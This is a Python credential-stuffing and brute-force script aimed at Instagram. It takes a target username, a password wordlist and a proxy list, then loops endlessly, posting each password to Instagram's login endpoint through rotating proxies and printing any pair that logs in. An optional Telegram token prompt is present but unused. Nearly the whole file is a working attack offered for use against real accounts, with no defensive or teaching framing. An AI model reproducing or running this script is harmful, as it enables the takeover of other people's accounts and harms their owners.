try :
    import requests,threading
    import random
    from time import sleep
    import os
except :
    os.system('pip install requests')
    os.system('pip install time')
    os.system('pip install random')
    os.system('pip install threading')


done=0
bad=0
secure=0
Block=0
print(""" \033[2;31m
 
  ▄████  █    ██   ██████   ██████ 
 ██▒ ▀█▒ ██  ▓██▒▒██    ▒ ▒██    ▒ 
▒██░▄▄▄░▓██  ▒██░░ ▓██▄   ░ ▓██▄   
░▓█  ██▓▓▓█  ░██░  ▒   ██▒  ▒   ██▒
░▒▓███▀▒▒▒█████▓ ▒██████▒▒▒██████▒▒
 ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░▒  ░ ░
░ ░   ░  ░░░ ░ ░ ░  ░  ░  ░  ░  ░  
      ░    ░           ░        ░  
                                                    
""")


a='qwertyuiopasdfghjklzxcvbnm098765432'
c = input("\033[1;34m with dend telegram ?   y/n : ")
fil = input("\033[1;34m [+] - file proxy : ")
f=input("\033[1;34m [+] - file your password : ")
user=input("\033[1;34m [+] - user target : ")
print('\n\n\n\n\n')
print('\n\n\n\n\n')
print('\n\n\n\n\n')
if c == 'n' :
    print(""" \033[2;31m
 
  ▄████  █    ██   ██████   ██████ 
 ██▒ ▀█▒ ██  ▓██▒▒██    ▒ ▒██    ▒ 
▒██░▄▄▄░▓██  ▒██░░ ▓██▄   ░ ▓██▄   
░▓█  ██▓▓▓█  ░██░  ▒   ██▒  ▒   ██▒
░▒▓███▀▒▒▒█████▓ ▒██████▒▒▒██████▒▒
 ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░▒  ░ ░
░ ░   ░  ░░░ ░ ░ ░  ░  ░  ░  ░  ░  
      ░    ░           ░        ░  
                                                    """)         
    while True :
        p = open(fil, "r")
        for prox in p.readlines():
          
            file = open(f, "r")
            for password in file.readlines():
             print('\n\n\n\n\n')
             print('\n\n\n\n\n')
             
             print(f"""\r \033[2;34m                                           [+] - HID | {done}       [X] BLOCK | {Block}            [=] SECURE | {secure}           [-] - BAD | {bad}   """,end='')
        
             proxsies={'http':prox}
             
             url = 'https://www.instagram.com/accounts/login/ajax/' 
             headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '275',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=YMdanwAEAAHbGwbzL3d_mjVac16b; csrftoken=voNeU14Q1AMv8Sg3TtyFW2KA2UkSJlpL;',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
            'x-csrftoken': 'voNeU14Q1AMv8Sg3TtyFW2KA2UkSJlpL',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
            'x-instagram-ajax': '0c15f4d7d44a',
            'x-requested-with': 'XMLHttpRequest'
        }
            
             data = {
                'username': f'{user}',
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
                }
             req_login = requests.post(url,headers=headers,data=data,proxies=proxsies).text
             if 'authenticated":true' in req_login:
                 done=done+1
                 print(user,':',password)
             elif 'To secure your account' in req_login :
                 secure=secure+1
             elif 'Sorry, there was a problem with your request' in req_login :
                 Block=Block+1
             else :
                 bad=bad+1
            
            







elif c == 'y' :
    print(""" \033[2;31m
 
  ▄████  █    ██   ██████   ██████ 
 ██▒ ▀█▒ ██  ▓██▒▒██    ▒ ▒██    ▒ 
▒██░▄▄▄░▓██  ▒██░░ ▓██▄   ░ ▓██▄   
░▓█  ██▓▓▓█  ░██░  ▒   ██▒  ▒   ██▒
░▒▓███▀▒▒▒█████▓ ▒██████▒▒▒██████▒▒
 ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░▒  ░ ░
░ ░   ░  ░░░ ░ ░ ░  ░  ░  ░  ░  ░  
      ░    ░           ░        ░  
                                                    
""")
    tok=input('[+] TOKEN : ')
    ID = input('[+] ID : ')
    print('\n\n\n\n\n')
    print('\n\n\n\n\n')
    print('\n\n\n\n\n')
    print(""" \033[2;31m
 
  ▄████  █    ██   ██████   ██████ 
 ██▒ ▀█▒ ██  ▓██▒▒██    ▒ ▒██    ▒ 
▒██░▄▄▄░▓██  ▒██░░ ▓██▄   ░ ▓██▄   
░▓█  ██▓▓▓█  ░██░  ▒   ██▒  ▒   ██▒
░▒▓███▀▒▒▒█████▓ ▒██████▒▒▒██████▒▒
 ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░▒  ░ ░
░ ░   ░  ░░░ ░ ░ ░  ░  ░  ░  ░  ░  
      ░    ░           ░        ░  
                                                    
""")
    while True :
        p = open(fil, "r")
        for prox in p.readlines():
            print('\n\n\n\n\n')
            print('\n\n\n\n\n')
            file = open(f, "r")
            for password in file.readlines():
             print(f"""\r \033[2;34m                                           [+] - HID | {done}       [X] BLOCK | {Block}            [=] SECURE | {secure}           [-] - BAD | {bad}   """,end='')
             
             
             proxsies={'http':prox}
            

             url = 'https://www.instagram.com/accounts/login/ajax/' 
             headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '275',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=YMdanwAEAAHbGwbzL3d_mjVac16b; csrftoken=voNeU14Q1AMv8Sg3TtyFW2KA2UkSJlpL;',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
            'x-csrftoken': 'voNeU14Q1AMv8Sg3TtyFW2KA2UkSJlpL',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
            'x-instagram-ajax': '0c15f4d7d44a',
            'x-requested-with': 'XMLHttpRequest'
        }
            
             data = {
            'username': f'{user}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
            }
        
             req_login = requests.post(url,headers=headers,data=data,proxies=proxsies).text
             
             if 'authenticated":true' in req_login:
                 done=done+1
                 print(user,':',password)
             elif 'To secure your account' in req_login :
                 secure=secure+1
             elif 'Sorry, there was a problem with your request' in req_login :
                 Block=Block+1
             else :
                 bad=bad+1
        
